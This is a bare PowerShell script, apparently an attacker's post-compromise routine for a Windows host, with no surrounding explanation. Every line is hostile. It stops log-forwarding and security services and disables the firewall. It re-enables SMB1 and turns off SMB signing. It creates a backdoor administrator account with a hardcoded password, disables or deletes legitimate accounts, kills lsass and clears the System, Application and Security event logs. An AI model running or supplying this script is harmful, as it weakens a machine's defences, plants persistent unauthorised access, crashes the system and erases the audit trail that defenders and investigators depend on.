Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore

$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
Disable-LocalUser -Name "algo"
Disable-LocalUser -Name "Administrator"
Remove-LocalUser -Name "Guest"
Remove-LocalUser -Name "WDAGUtilityAccount"
Remove-LocalUser -Name "DefaultAccount"

Stop-Process -Name "lsass" -ErrorAction Ignore

Clear-EventLog -LogName System
Clear-EventLog -LogName Application
Clear-EventLog -LogName Security
